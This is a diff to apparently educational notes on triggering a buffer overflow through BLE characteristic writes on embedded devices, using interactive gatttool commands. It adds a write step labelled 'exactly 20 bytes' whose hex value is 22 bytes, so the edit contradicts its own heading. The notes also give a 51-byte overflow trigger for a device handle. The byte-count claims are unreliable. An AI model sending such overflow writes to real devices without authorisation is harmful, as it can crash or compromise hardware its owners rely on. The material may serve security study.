@@ -27,12 +27,18 @@ Embedded devices often lack proper input validation on BLE write operations. Thi
 
 ## Useful Commands
 
+### Connect to the device
+```bash
+gatttool -b <MAC> -I
+[<MAC>][LE]> connect
+```
+
 ### Write exactly 20 bytes (normal behavior)
 ```bash
-gatttool -b <MAC> --char-write-req --handle=<HANDLE> --value=$(python3 -c "print('41'*20)")
+[<MAC>][LE]> char-write-req <HANDLE> 41414141414141414141414141414141414141414141
 ```
 
 ### Write 51 bytes (overflow trigger)
 ```bash
-gatttool -b <MAC> --char-write-req --handle=<HANDLE> --value=$(python3 -c "print('41'*51)")
+[<MAC>][LE]> char-write-req <HANDLE> 414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141414141
 ```
